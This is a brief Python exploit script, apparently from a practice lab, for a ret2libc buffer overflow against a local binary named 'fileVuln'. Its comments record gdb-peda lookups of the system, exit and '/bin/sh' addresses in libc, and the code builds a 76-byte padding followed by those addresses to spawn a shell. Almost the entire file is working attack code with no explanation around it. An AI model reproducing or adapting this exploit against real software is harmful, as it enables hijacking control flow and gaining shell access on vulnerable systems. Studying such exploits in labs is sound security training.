#!/usr/bin/python3

from struct import pack
from subprocess import call

if __name__ == '__main__':

	#gdb-peda$ p system
	#$1 = {<text variable, no debug info>} 0xb7e42db0 <__libc_system>
	#gdb-peda$ p exit
	#$2 = {<text variable, no debug info>} 0xb7e369e0 <__GI_exit>
	#gdb-peda$ find "/bin/sh" all
	#Searching for '/bin/sh' in: all ranges
	#Found 1 results, display max 1 items:
	#libc : 0xb7f63b2b ("/bin/sh")

	# EIP -> system + exit + bin_sh

	system_addr = pack("<I", 0xb7e42db0)
	exit_addr = pack("<I", 0xb7e369e0)
	bin_sh_addr = pack("<I", 0xb7f63b2b)

	offset = 76
	junk = b"A"*offset
	EIP = system_addr + exit_addr + bin_sh_addr

	payload = junk + EIP

	call(["/home/test/ret2libc/fileVuln"], payload)
